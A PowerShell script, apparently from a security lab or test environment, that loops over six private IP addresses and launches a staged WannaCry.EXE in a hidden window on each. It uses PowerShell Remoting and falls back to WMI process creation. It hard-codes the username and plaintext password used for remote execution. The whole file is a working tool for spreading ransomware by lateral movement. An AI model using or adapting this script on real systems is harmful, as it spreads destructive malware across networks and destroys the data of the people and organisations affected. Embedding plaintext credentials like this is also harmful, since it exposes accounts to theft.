# List of target IPs
$ips = @("10.0.10.1", "10.0.10.102", "10.0.10.151", "10.0.10.150", "10.0.10.200", "10.0.10.100")

# Path of the remote executable
$remoteExePath = "C:\Windows\Temp\WannaCry.EXE"  # Ensure this file exists on each target machine

# Credentials for remote execution
$username = "trendmicro"
$password = "trendmicro123"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $securePassword)

# Function to execute remotely using PowerShell Remoting
function Execute-RemoteCommand {
    param ($target, $exePath, $cred)

    Write-Host "Attempting to execute $exePath on $target using PowerShell Remoting..."
    try {
        Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock {
            param ($exe)
            Start-Process -FilePath $exe -WindowStyle Hidden
        } -ArgumentList $exePath -ErrorAction Stop

        Write-Host "[+] Successfully executed $exePath on $target"
    }
    catch {
        Write-Host "[-] PowerShell Remoting failed on $target. Trying WMI..."
        Execute-RemoteWMI -target $target -exePath $exePath -cred $cred
    }
}

# Function to execute remotely using WMI if PowerShell Remoting fails
function Execute-RemoteWMI {
    param ($target, $exePath, $cred)

    try {
        Invoke-WmiMethod -Path Win32_Process -Name Create -ArgumentList $exePath -Credential $cred -ComputerName $target -ErrorAction Stop
        Write-Host "[+] Successfully executed $exePath on $target via WMI"
    }
    catch {
        Write-Host "[-] Failed to execute $exePath on $target via WMI"
    }
}

# Loop through all target machines and execute the file
foreach ($ip in $ips) {
    Execute-RemoteCommand -target $ip -exePath $remoteExePath -cred $cred
}

Write-Host "`nTask Completed."
